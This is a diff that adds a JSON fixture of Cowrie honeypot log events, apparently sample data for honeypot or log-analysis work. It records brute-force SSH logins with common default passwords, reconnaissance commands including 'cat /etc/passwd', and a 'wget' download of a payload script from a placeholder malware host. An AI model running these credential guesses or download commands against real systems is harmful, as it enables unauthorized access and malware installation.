@@ -1,0 +1,17 @@
+[
+  {"eventid": "cowrie.session.connect", "src_ip": "203.0.113.42", "session": "a1b2c3d4e5f6", "src_port": 44321, "timestamp": "2026-09-17T10:30:00Z", "message": "TCP connection added: 203.0.113.42:44321 -> 192.168.1.10:2222"},
+  {"eventid": "cowrie.login.failed", "src_ip": "203.0.113.42", "session": "a1b2c3d4e5f6", "username": "admin", "password": "123456", "timestamp": "2026-09-17T10:30:05Z", "message": "login attempt [admin/123456] failed"},
+  {"eventid": "cowrie.login.failed", "src_ip": "203.0.113.42", "session": "a1b2c3d4e5f6", "username": "admin", "password": "admin", "timestamp": "2026-09-17T10:30:08Z", "message": "login attempt [admin/admin] failed"},
+  {"eventid": "cowrie.login.failed", "src_ip": "203.0.113.42", "session": "a1b2c3d4e5f6", "username": "root", "password": "toor", "timestamp": "2026-09-17T10:30:11Z", "message": "login attempt [root/toor] failed"},
+  {"eventid": "cowrie.login.success", "src_ip": "203.0.113.42", "session": "a1b2c3d4e5f6", "username": "admin", "password": "test123", "timestamp": "2026-09-17T10:30:15Z", "message": "login attempt [admin/test123] succeeded"},
+  {"eventid": "cowrie.command.input", "src_ip": "203.0.113.42", "session": "a1b2c3d4e5f6", "input": "whoami", "timestamp": "2026-09-17T10:30:20Z", "message": "command input: whoami"},
+  {"eventid": "cowrie.command.input", "src_ip": "203.0.113.42", "session": "a1b2c3d4e5f6", "input": "uname -a", "timestamp": "2026-09-17T10:30:22Z", "message": "command input: uname -a"},
+  {"eventid": "cowrie.command.input", "src_ip": "203.0.113.42", "session": "a1b2c3d4e5f6", "input": "cat /etc/passwd", "timestamp": "2026-09-17T10:30:25Z", "message": "command input: cat /etc/passwd"},
+  {"eventid": "cowrie.command.input", "src_ip": "203.0.113.42", "session": "a1b2c3d4e5f6", "input": "wget http://malware.example.com/payload.sh", "timestamp": "2026-09-17T10:30:30Z", "message": "command input: wget http://malware.example.com/payload.sh"},
+  {"eventid": "cowrie.command.input", "src_ip": "203.0.113.42", "session": "a1b2c3d4e5f6", "input": "chmod 777 /tmp/payload.sh", "timestamp": "2026-09-17T10:30:33Z", "message": "command input: chmod 777 /tmp/payload.sh"},
+  {"eventid": "cowrie.session.connect", "src_ip": "198.51.100.7", "session": "f6e5d4c3b2a1", "src_port": 52143, "timestamp": "2026-09-17T11:15:00Z", "message": "TCP connection added: 198.51.100.7:52143 -> 192.168.1.10:2222"},
+  {"eventid": "cowrie.login.failed", "src_ip": "198.51.100.7", "session": "f6e5d4c3b2a1", "username": "root", "password": "password", "timestamp": "2026-09-17T11:15:03Z", "message": "login attempt [root/password] failed"},
+  {"eventid": "cowrie.login.failed", "src_ip": "198.51.100.7", "session": "f6e5d4c3b2a1", "username": "root", "password": "123456", "timestamp": "2026-09-17T11:15:06Z", "message": "login attempt [root/123456] failed"},
+  {"eventid": "cowrie.session.closed", "src_ip": "198.51.100.7", "session": "f6e5d4c3b2a1", "timestamp": "2026-09-17T11:15:10Z", "duration": 10000, "message": "session closed"},
+  {"eventid": "cowrie.session.closed", "src_ip": "203.0.113.42", "session": "a1b2c3d4e5f6", "timestamp": "2026-09-17T10:35:00Z", "duration": 300000, "message": "session closed"}
+]
